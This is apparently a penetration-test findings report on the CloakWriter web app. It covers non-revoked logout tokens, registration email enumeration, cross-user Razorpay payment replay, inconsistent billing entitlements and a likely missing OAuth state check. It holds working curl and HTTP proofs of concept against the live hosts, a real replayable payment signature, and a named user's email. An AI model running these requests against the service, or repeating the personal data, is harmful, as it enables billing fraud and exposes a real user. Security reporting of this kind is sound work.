# CloakWriter Security Assessment Findings

Date: August 20, 2026  
Scope:
- `https://cloakwriter.app`
- `https://api.cloakwriter.app`

Method:
- Low-volume manual testing
- Controlled accounts only
- Frontend bundle inspection
- Burp traffic review
- Direct HTTP replay

## Executive Summary

This session produced two confirmed vulnerabilities and one additional confirmed server-side state inconsistency tied to billing:

1. Logout does not invalidate bearer tokens.
2. Registration endpoint allows account enumeration.
3. Razorpay payment verification is replayable, cross-user reusable, and inconsistent with entitlement enforcement.

It also produced one strong but not yet fully live-reproduced candidate:

4. Google OAuth login CSRF / forced-login due to missing `state`.

---

## Findings At A Glance

| ID | Title | Status | Severity |
|---|---|---|---|
| CW-001 | Logout does not invalidate active bearer tokens | CONFIRMED | Medium |
| CW-002 | Registration endpoint allows email enumeration | CONFIRMED | Low |
| CW-003 | Razorpay verification accepts replayed and cross-user payment artifacts | CONFIRMED | High |
| CW-004 | Billing state machine inconsistent with entitlement enforcement | CONFIRMED | Medium |
| CW-005 | Google OAuth flow appears to lack `state` validation | LIKELY | Medium |

---

## CW-001: Logout Does Not Invalidate Active Bearer Tokens

Status: `CONFIRMED`  
Severity: `Medium`

### Summary

`POST /api/auth/logout` returns success, but the same bearer token remains valid for protected endpoints afterward.

### Affected Endpoint

- `POST /api/auth/logout`

### Security Impact

- Logged-out sessions remain usable.
- Token theft impact is extended because logout is not a remediation.
- Session lifecycle is inconsistent and may mislead users into thinking a session is closed when it is not.

### Reproduction

1. Authenticate and obtain a valid bearer token.
2. Send:

```http
POST /api/auth/logout HTTP/1.1
Host: api.cloakwriter.app
Authorization: Bearer <valid_token>
```

3. Reuse the same token against a protected endpoint:

```http
GET /api/auth/me HTTP/1.1
Host: api.cloakwriter.app
Authorization: Bearer <same_token>
```

### Expected

- Logout should invalidate the token or otherwise make it unusable.

### Observed

- The same token remained valid on protected endpoints after logout.

### Evidence

- `POST /api/auth/logout` returned success.
- Reused token still worked on:
  - `GET /api/auth/me`
  - `POST /api/auth/razorpay/create-order`

### Likely Root Cause

- Stateless JWTs are accepted without server-side revocation or logout tracking.

---

## CW-002: Registration Endpoint Allows Email Enumeration

Status: `CONFIRMED`  
Severity: `Low`

### Summary

`POST /api/auth/register` discloses whether an email already exists by returning a distinct duplicate-account error.

### Affected Endpoint

- `POST /api/auth/register`

### Security Impact

- Attackers can confirm which addresses are registered.
- This improves targeting for credential stuffing, phishing, and password-reset abuse.

### Reproduction

#### Baseline: fresh email

```http
POST /api/auth/register HTTP/1.1
Host: api.cloakwriter.app
Content-Type: application/json

{
  "name": "Test User",
  "email": "fresh-alias@example.com",
  "password": "examplepass"
}
```

Observed:
- `200 OK`

#### Enumeration: existing email

```http
POST /api/auth/register HTTP/1.1
Host: api.cloakwriter.app
Content-Type: application/json

{
  "name": "Test User",
  "email": "<existing_controlled_email>",
  "password": "examplepass"
}
```

Observed:

```json
{"detail":"An account with this email already exists."}
```

### Expected

- Registration should return a generic response that does not reveal account existence.

### Observed

- Existing accounts trigger a distinct duplicate-email message.

### Likely Root Cause

- Backend returns direct uniqueness failure to the client.

---

## CW-003: Razorpay Verification Accepts Replayed And Cross-User Payment Artifacts

Status: `CONFIRMED`  
Severity: `High`

### Summary

A previously successful Razorpay verification payload can be replayed. The same successful payment artifact was also accepted under a different authenticated user.

### Affected Endpoint

- `POST /api/auth/razorpay/verify-payment`

### Security Impact

- Payment-success artifacts are not single-use.
- Payment verification is not bound tightly to the purchasing account.
- Another authenticated user can submit a different user’s successful payment artifact and receive `200 OK`.

### Controlled Artifact Used

Recovered from Burp project data:

```json
{
  "razorpay_order_id": "order_TRx1zhrUk0LE1g",
  "razorpay_payment_id": "pay_TRx6TF5K0HDqsV",
  "razorpay_signature": "48121ca63636a8152faed1eb46964157eb98eea25906c12bc120e98005e9f6bf",
  "plan": "enterprise"
}
```

### Reproduction

#### A. Replay on original account A

```http
POST /api/auth/razorpay/verify-payment HTTP/1.1
Host: api.cloakwriter.app
Authorization: Bearer <user_A_token>
Content-Type: application/json

{
  "razorpay_order_id": "order_TRx1zhrUk0LE1g",
  "razorpay_payment_id": "pay_TRx6TF5K0HDqsV",
  "razorpay_signature": "48121ca63636a8152faed1eb46964157eb98eea25906c12bc120e98005e9f6bf",
  "plan": "enterprise"
}
```

Observed:
- `200 OK`

#### B. Replay on different account B

```http
POST /api/auth/razorpay/verify-payment HTTP/1.1
Host: api.cloakwriter.app
Authorization: Bearer <user_B_token>
Content-Type: application/json

{
  "razorpay_order_id": "order_TRx1zhrUk0LE1g",
  "razorpay_payment_id": "pay_TRx6TF5K0HDqsV",
  "razorpay_signature": "48121ca63636a8152faed1eb46964157eb98eea25906c12bc120e98005e9f6bf",
  "plan": "enterprise"
}
```

Observed:
- `200 OK`
- Response body identified user B and returned `plan:"enterprise"`

### Expected

- A successful payment artifact should be single-use or safely idempotent for the same owner only.
- Another account should not be able to redeem it.

### Observed

- Same payment artifact was accepted again.
- Same artifact was accepted under a different account.

### Evidence

Response for B:

```json
{
  "id": "1a8cb5cb-f214-4143-a588-6c3b53acdbcf",
  "name": "Anij Gurung",
  "email": "anij@fishtailinfosolutions.com",
  "plan": "enterprise",
  "role": "user",
  "usage_count": 160
}
```

### Likely Root Cause

- Missing order ownership enforcement.
- Missing replay/idempotency protection.
- Trust in a valid signature without tying it to the current authenticated user and server-side order record.

---

## CW-004: Billing State Machine Is Inconsistent With Entitlement Enforcement

Status: `CONFIRMED`  
Severity: `Medium`

### Summary

The billing verification endpoint and the rewrite entitlement checks disagree about the effective plan for the same user/session.

### Affected Endpoints

- `POST /api/auth/razorpay/verify-payment`
- `GET /api/auth/me`
- `POST /api/rewrite`

### Security Impact

- Payment success and effective entitlement are inconsistent.
- Clients may be told an upgrade succeeded while plan-gated operations still enforce the old plan.
- This indicates a broken multi-step business state machine.

### Reproduction

#### 1. Baseline plan-gated failure on B

```http
POST /api/rewrite HTTP/1.1
Host: api.cloakwriter.app
Authorization: Bearer <user_B_token>
Content-Type: application/json

{
  "text": "This is a short controlled rewrite probe to test current entitlement.",
  "mode": "standard",
  "level": 1
}
```

Observed:

```json
{"detail":"Pro plan limit reached (80 humanizations per day used). Please upgrade your plan to continue or try again tomorrow."}
```

#### 2. Replay successful enterprise verification artifact for B

```http
POST /api/auth/razorpay/verify-payment HTTP/1.1
Host: api.cloakwriter.app
Authorization: Bearer <user_B_token>
Content-Type: application/json

{
  "razorpay_order_id": "order_TRx1zhrUk0LE1g",
  "razorpay_payment_id": "pay_TRx6TF5K0HDqsV",
  "razorpay_signature": "48121ca63636a8152faed1eb46964157eb98eea25906c12bc120e98005e9f6bf",
  "plan": "enterprise"
}
```

Observed:
- `200 OK`
- Response body claimed `plan:"enterprise"`

#### 3. Retry authenticated rewrite immediately

```http
POST /api/rewrite HTTP/1.1
Host: api.cloakwriter.app
Authorization: Bearer <user_B_token>
Content-Type: application/json

{
  "text": "This is a second short controlled rewrite probe immediately after replaying enterprise billing state.",
  "mode": "standard",
  "level": 1
}
```

Observed:

```json
{"detail":"Pro plan limit reached (80 humanizations per day used). Please upgrade your plan to continue or try again tomorrow."}
```

### Expected

- Payment verification, account state, and rewrite enforcement should all agree on the active plan.

### Observed

- `verify-payment` reported `enterprise`.
- Rewrite enforcement still treated the user as `pro`.

### Notes

- This does not reduce the severity of CW-003.
- It shows the billing flow is not just replayable; it is internally inconsistent.

### Likely Root Cause

- Different code paths trust different sources of truth for plan state.
- Payment verification appears to construct a success response that does not reliably match the authorization path used by `/api/rewrite`.

---

## CW-005: Google OAuth Flow Appears To Lack `state` Validation

Status: `LIKELY`  
Severity: `Medium`

### Summary

Observed frontend and backend OAuth flow data indicate no `state` parameter is used, creating a likely login CSRF / forced-login condition.

### Affected Endpoint / Flow

- Google authorization URL generation on `cloakwriter.app`
- `POST /api/auth/google`

### Evidence

Frontend Google auth URL builder observed:

```text
https://accounts.google.com/o/oauth2/v2/auth
  ?client_id=<id>
  &redirect_uri=https://cloakwriter.app/api/auth/callback/google
  &response_type=code
  &scope=openid%20email%20profile
  &prompt=select_account
```

No `state` parameter present.

Captured backend exchange:

```http
POST /api/auth/google HTTP/1.1
Host: api.cloakwriter.app
Content-Type: application/json
Origin: https://cloakwriter.app

{
  "code": "<google_auth_code>",
  "redirect_uri": "https://cloakwriter.app/api/auth/callback/google"
}
```

No `state` in the request body.

### Security Impact

- A victim browser may be forced into the attacker’s CloakWriter account if the attacker can supply their own valid Google code.
- This becomes more serious if victim actions afterward are stored under the attacker’s CloakWriter account.

### Why This Is Not Marked Confirmed

- A full live cross-session forced-login repro was not completed in this session.

### Recommended Validation

1. Obtain a fresh Google auth code for attacker-controlled Google account A.
2. In a clean victim session B, submit:

```http
POST /api/auth/google HTTP/1.1
Host: api.cloakwriter.app
Content-Type: application/json

{
  "code": "<fresh_code_for_account_A>",
  "redirect_uri": "https://cloakwriter.app/api/auth/callback/google"
}
```

3. Check whether session B becomes authenticated as account A.

If yes, promote to `CONFIRMED`.

---

## Additional Notes And Negative Results

These were actively tested and did not become findings in this session:

- `POST /api/auth/login` did not expose straightforward enumeration between nonexistent and existing users.
- `POST /api/auth/forgot-password` returned a generic response for existing and nonexistent emails.
- `POST /api/auth/verify-email` wrong-code testing did not reveal account existence.
- Tampered or malformed JWTs were rejected on tested protected endpoints.
- Normal-user access to tested `/api/admin/*` endpoints returned `401` or `403`.
- `PATCH /api/auth/profile` over-posting of `role`, `plan`, `usage_count`, `id`, `user_id` did not persist unauthorized changes.
- Tested `/api/user/history` requests did not produce cross-user read/write access.
- Stored XSS via profile `name` was blocked by validation.

---

## Recommended Next Steps

1. Complete a live Google OAuth forced-login repro to confirm or kill CW-005.
2. Re-test billing with a freshly issued token after replay to determine whether entitlement persistence exists beyond the current authorization path.
3. Review server-side payment verification for:
   - order ownership checks
   - replay protection
   - server-side plan derivation
   - idempotency rules
4. Fix logout by introducing token revocation or short-lived tokens with server-side session invalidation.
5. Normalize registration responses to remove email enumeration.

---

## Minimal PoC Snippets

### Logout Token Reuse

```bash
curl -i https://api.cloakwriter.app/api/auth/logout \
  -H 'Authorization: Bearer <token>' \
  -X POST

curl -i https://api.cloakwriter.app/api/auth/me \
  -H 'Authorization: Bearer <same_token>'
```

### Registration Enumeration

```bash
curl -i https://api.cloakwriter.app/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"name":"Test User","email":"existing@example.com","password":"examplepass"}'
```

### Cross-User Billing Replay

```bash
curl -i https://api.cloakwriter.app/api/auth/razorpay/verify-payment \
  -H 'Authorization: Bearer <user_B_token>' \
  -H 'Content-Type: application/json' \
  -d '{
    "razorpay_order_id":"order_TRx1zhrUk0LE1g",
    "razorpay_payment_id":"pay_TRx6TF5K0HDqsV",
    "razorpay_signature":"48121ca63636a8152faed1eb46964157eb98eea25906c12bc120e98005e9f6bf",
    "plan":"enterprise"
  }'
```

### Billing State Inconsistency

```bash
curl -i https://api.cloakwriter.app/api/rewrite \
  -H 'Authorization: Bearer <user_B_token>' \
  -H 'Content-Type: application/json' \
  -d '{"text":"probe","mode":"standard","level":1}'
```

